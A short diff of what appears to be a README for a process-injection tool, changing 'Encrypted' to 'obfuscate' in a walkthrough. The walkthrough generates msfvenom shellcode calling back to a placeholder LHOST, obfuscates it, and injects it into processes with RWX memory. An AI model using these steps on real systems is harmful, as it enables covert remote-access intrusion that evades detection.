@@ -29,7 +29,7 @@ and I removed unnecessary stuff, which provided me a good practice and refresher
 ### Walkthrough
 
 1. So first, I started by generating a shellcode with msfvenom : `msfvenom -p <PAYLOAD> LHOST=<YOUR_IP> LPORT=<PORT> -f c > <NAME>.c`
-2. Then I Encrypted the payload, I have an encryptor program that i used, you can find it on my Github (you can create your own too) : `Crypter`
+2. Then I obfuscate the payload, I have an obfuscation program that i used, you can find it on my Github (you can create your own too) : `Crypter`
 3. The main program will
     - Get an handle on each processes and duplicate them (for future implementations i duplicate them, to be able to perform additionnal executions and also to be able to immediately close the handle i opened)
     - Check if the process has RWX memory section and get that address in memory
